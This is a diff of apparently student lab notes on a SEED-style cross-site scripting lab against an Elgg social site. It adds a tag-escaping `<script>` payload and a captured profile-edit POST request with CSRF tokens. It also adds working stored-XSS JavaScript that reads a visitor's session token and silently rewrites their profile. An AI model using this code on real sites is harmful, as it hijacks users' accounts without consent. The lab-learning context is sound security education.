@@ -96,12 +96,48 @@
 
 - what if the web application only provide the Editor mode for the `About Me` field, i.e., we cannot switch to the Text mode, can we still launch a sucessful attack?
     - if we directly put the code in `About Me` field, it will not work
-    - after entering some content, e.g., `xyz`, click `Edit HTML`, we can see that the actual content is `<p>xyz</p>`, the content we input will be treated as a segment of text, we can bypass this by using the following payload
-        - `</p><script>alert('XSS');</script><p>`
-        - HTML code in browser
-            ```
-            <p></p>
-            <script>alert('XSS');</script> <---- JS code
-            </p><p>
-            ```
+    - after entering some content, e.g., `xyz`, click `Edit HTML`, we can see that the actual content is `<p>xyz</p>`, our input will be treated as text, but we can bypass this by using `</p><script>alert('XSS');</script><p>`, then the HTML of the page will be
+        ```
+        <p></p>
+        <script>alert('XSS');</script> <---- JS code
+        </p><p>
+        ```
 ## Task 5: Modifying the Victim's Profile
+- objective: modify the victim's profile when the victime visits Samy's page (Specifically, the `About Me` field)
+- login as Samy, edit the profile, input `7777` in `About Me` field, then save, by using HTTP Header Live, we can find the request, it is a POST request
+    - request URL: `http://www.seed-server.com/action/profile/edit`
+    - data in the request body
+        ```
+        __elgg_token=XI904ZLJZyFQND80lxnwyw&__elgg_ts=1707043935&name=Samy&description=<p>777777777777</p> &accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=59
+        ```
+    - edit the data as follows, and resend the request, we successfully modified the `About Me` field, this means we only need to include these parameters in the forged request
+        ```
+        __elgg_token=XI904ZLJZyFQND80lxnwyw&__elgg_ts=1707043935&name=Samy&description=<p>123</p> &guid=59
+        ```
+    - put the malicious JS code in Samy's profile
+        ```
+        <script type="text/javascript">
+            window.onload = function () {
+                var userName="&name="+elgg.session.user.name;
+                var guid="&guid="+elgg.session.user.guid;
+                var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+                var token="&__elgg_token="+elgg.security.token.__elgg_token;
+                var sendurl="http://www.seed-server.com/action/profile/edit";
+                
+                var content="description=<p>MODIFIED!</p>"+ts+token+guid+userName;
+                var samyGuid=59;
+                
+                if(elgg.session.user.guid!=samyGuid) {
+                    var Ajax=null;
+                    Ajax=new XMLHttpRequest();
+                    Ajax.open("POST", sendurl, true);
+                    Ajax.setRequestHeader("Content-Type", 
+                                "application/x-www-form-urlencoded");
+                    Ajax.send(content);
+                }
+            }
+        </script>
+        ```
+    - login as Alice, visit Samy's profile, then we can find that Alice's About Me is `MODIFIED!`
+
+## Task 6: 
